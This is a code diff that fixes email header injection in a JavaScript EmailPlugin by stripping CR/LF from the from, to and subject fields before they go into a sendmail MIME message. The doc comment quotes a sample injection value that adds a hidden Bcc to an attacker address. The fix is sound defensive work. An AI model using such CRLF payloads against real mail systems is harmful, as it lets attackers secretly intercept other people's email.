@@ -63,16 +63,33 @@ export class EmailPlugin extends BasePlugin {
     buildSendmailInvocation(mime, sendmailPath) {
         return { command: `${sendmailPath} -t -i`, input: mime };
     }
+    /**
+     * Strip CR/LF from a value bound for a MIME header line. The MIME string
+     * below is built by joining fields with \r\n, so a from/to/subject
+     * containing an embedded \r\n breaks out of its own header line and
+     * injects arbitrary extra header lines into the message -- e.g. a
+     * subject of "Hello\r\nBcc: attacker@evil.com" appends a genuine Bcc:
+     * header that sendmail honors, silently blind-copying every outgoing
+     * message wherever the caller's subject/from/to content isn't fully
+     * trusted. This is header injection, a different vulnerability class
+     * from buildSendmailInvocation()'s already-fixed shell-command
+     * injection (which passes the whole MIME body via stdin, not the shell
+     * command string) -- stdin safety does nothing to stop the message
+     * *content itself* from containing forged header lines.
+     */
+    sanitizeHeaderValue(value) {
+        return value.replace(/[\r\n]+/g, ' ');
+    }
     trySendmail(email) {
         const sendmailPath = this.which('sendmail') || this.which('ssmtp') || this.which('msmtp');
         if (!sendmailPath)
             return false;
         try {
-            const recipients = email.to.map(t => `<${t}>`).join(', ');
+            const recipients = email.to.map(t => `<${this.sanitizeHeaderValue(t)}>`).join(', ');
             const mime = [
-                `From: ${email.from}`,
+                `From: ${this.sanitizeHeaderValue(email.from)}`,
                 `To: ${recipients}`,
-                `Subject: ${email.subject}`,
+                `Subject: ${this.sanitizeHeaderValue(email.subject)}`,
                 `Date: ${new Date(email.timestamp).toUTCString()}`,
                 'Content-Type: text/plain; charset=UTF-8',
                 'Content-Transfer-Encoding: 8bit',
